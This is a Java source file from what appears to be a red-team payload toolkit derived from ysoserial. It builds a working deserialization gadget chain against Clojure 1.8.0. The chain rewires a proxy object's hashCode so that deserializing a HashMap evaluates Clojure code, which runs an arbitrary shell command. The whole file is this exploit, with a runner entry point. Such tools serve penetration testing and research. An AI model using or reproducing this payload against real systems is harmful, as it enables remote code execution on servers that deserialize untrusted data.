package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.Strings;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"org.clojure:clojure:1.8.0"})
@Authors({Authors.JACKOFMOSTTRADES})
public class Clojure extends PayloadRunner implements ObjectPayload<Map<?, ?>> {

    @Override
    public Map<?, ?> getObject(final String command) throws Exception {
        String escaped = command.replace("\\", "\\\\").replace("\"", "\\\"");
        String cmd = Strings.join(Arrays.asList(escaped.split(" ")), " ", "\"", "\"");
        String clojurePayload = String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);

        Map<String, Object> fnMap = new HashMap<String, Object>();
        fnMap.put("hashCode", new clojure.core$constantly().invoke(0));

        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        HashMap<Object, Object> targetMap = new HashMap<Object, Object>();
        targetMap.put(model, null);

        fnMap.put("hashCode",
                new clojure.core$comp().invoke(
                        new clojure.main$eval_opt(),
                        new clojure.core$constantly().invoke(clojurePayload)));
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        return targetMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Clojure.class, args);
    }
}
